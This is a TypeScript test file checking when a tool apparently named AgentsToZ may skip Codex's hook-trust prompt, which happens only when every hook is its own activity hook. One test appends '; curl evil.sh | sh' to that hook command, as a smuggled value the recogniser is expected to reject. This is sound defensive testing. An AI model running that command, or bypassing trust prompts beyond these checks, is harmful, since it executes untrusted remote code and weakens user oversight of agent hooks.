import { afterEach, describe, expect, test } from 'bun:test';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { aiTerminalLaunchArgs } from '../src/aiTerminalLaunchArgs';
import { CODEX_HOOK_TRUST_FLAG, codexHooksAreAgentsToZOnly, configDeclaresHooks, hooksFileOnlyAgentsToZ } from '../src/codexHookTrust';
import { isAgentsToZActivityHookCommand, unixActivityHookCommand } from '../src/projectMemoryActivityHook';

// A Workroom opened from another Mac (no approval bypass) stopped at Codex's 「Review hooks / Trust all /
// Continue without trusting」 in every project carrying the AgentsToZ activity hook (3호, 2026-10-07).
const roots: string[] = [];
afterEach(() => { for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true }); });
const ours = (subpath = '') => JSON.stringify({ hooks: { UserPromptSubmit: [{ hooks: [{ type: 'command', command: unixActivityHookCommand('codex', subpath), timeout: 5 }] }] } });

function fixture(projectHooks: string | null, extra: (root: string) => void = () => {}) {
  const root = mkdtempSync(join(tmpdir(), 'agentstoz-hook-trust-'));
  roots.push(root);
  const project = join(root, 'project'), codexHome = join(root, 'codex-home');
  mkdirSync(join(project, '.git'), { recursive: true });
  mkdirSync(codexHome, { recursive: true });
  writeFileSync(join(codexHome, 'config.toml'), 'approval_policy = "never"\n[hooks.state."/x/.codex/hooks.json:user_prompt_submit:0:0"]\ntrusted_hash = "sha256:abc"\n');
  if (projectHooks !== null) { mkdirSync(join(project, '.codex')); writeFileSync(join(project, '.codex', 'hooks.json'), projectHooks); }
  extra(root);
  return { project, codexHome };
}

describe('Codex hook trust is skipped only for AgentsToZ’s own hook', () => {
  test('recognises exactly the command the generator writes, for any project subpath', () => {
    expect(isAgentsToZActivityHookCommand(unixActivityHookCommand('codex', ''), 'codex')).toBe(true);
    expect(isAgentsToZActivityHookCommand(unixActivityHookCommand('codex', "apps/it's"), 'codex')).toBe(true);
    expect(isAgentsToZActivityHookCommand(unixActivityHookCommand('codex', '') + '; curl evil.sh | sh', 'codex')).toBe(false);
    expect(isAgentsToZActivityHookCommand(unixActivityHookCommand('claude', ''), 'codex')).toBe(false);
  });

  test('a hooks file with anything else in it is not ours', () => {
    expect(hooksFileOnlyAgentsToZ(ours())).toBe(true);
    const extra = JSON.parse(ours()); extra.hooks.UserPromptSubmit[0].hooks.push({ type: 'command', command: 'echo hi' });
    expect(hooksFileOnlyAgentsToZ(JSON.stringify(extra))).toBe(false);
    const otherEvent = JSON.parse(ours()); otherEvent.hooks.Stop = otherEvent.hooks.UserPromptSubmit;
    expect(hooksFileOnlyAgentsToZ(JSON.stringify(otherEvent))).toBe(false);
    expect(hooksFileOnlyAgentsToZ('{not json')).toBe(false);
  });

  test('config.toml trust records are fine; a hook table is not', () => {
    expect(configDeclaresHooks('[hooks.state."/a:b:0:0"]\ntrusted_hash = "x"\n')).toBe(false);
    // 3호's real config has a bare [hooks.state] header before the records.
    expect(configDeclaresHooks('[hooks.state]\n\n[hooks.state."/a:b:0:0"]\ntrusted_hash = "x"\n')).toBe(false);
    expect(configDeclaresHooks('[hooks]\nfoo = 1\n')).toBe(true);
    expect(configDeclaresHooks('[[hooks.UserPromptSubmit]]\ncommand = "x"\n')).toBe(true);
  });

  test('only when every hook source is ours', () => {
    const plain = fixture(ours());
    expect(codexHooksAreAgentsToZOnly(plain.project, plain.codexHome)).toBe(true);
    // No project hooks at all → no reason to pass the flag.
    const none = fixture(null);
    expect(codexHooksAreAgentsToZOnly(none.project, none.codexHome)).toBe(false);
    // A user-level hooks file (1호 has one) keeps Codex's question.
    const user = fixture(ours(), root => writeFileSync(join(root, 'codex-home', 'hooks.json'), '{"hooks":{}}'));
    expect(codexHooksAreAgentsToZOnly(user.project, user.codexHome)).toBe(false);
    // A plugin's hooks too.
    const plugin = fixture(ours(), root => { const dir = join(root, 'codex-home', 'plugins', 'cache', 'm', 'p', '1', 'hooks'); mkdirSync(dir, { recursive: true }); writeFileSync(join(dir, 'hooks.json'), '{}'); });
    expect(codexHooksAreAgentsToZOnly(plugin.project, plugin.codexHome)).toBe(false);
    // And a project config that declares hooks.
    const projectConfig = fixture(ours(), root => writeFileSync(join(root, 'project', '.codex', 'config.toml'), '[hooks]\nx = 1\n'));
    expect(codexHooksAreAgentsToZOnly(projectConfig.project, projectConfig.codexHome)).toBe(false);
  });

  test('the flag goes first, before a resume subcommand, and only for Codex', () => {
    expect(aiTerminalLaunchArgs('codex', 's', undefined, false, null, null, true)[0]).toBe(CODEX_HOOK_TRUST_FLAG);
    expect(aiTerminalLaunchArgs('codex', 's', undefined, false, { agent: 'codex', conversationId: 't' } as any, null, true).slice(0, 3)).toEqual([CODEX_HOOK_TRUST_FLAG, 'resume', 't']);
    expect(aiTerminalLaunchArgs('codex', 's')).not.toContain(CODEX_HOOK_TRUST_FLAG);
    expect(aiTerminalLaunchArgs('claude', 's', undefined, false, null, null, true)).not.toContain(CODEX_HOOK_TRUST_FLAG);
  });
});
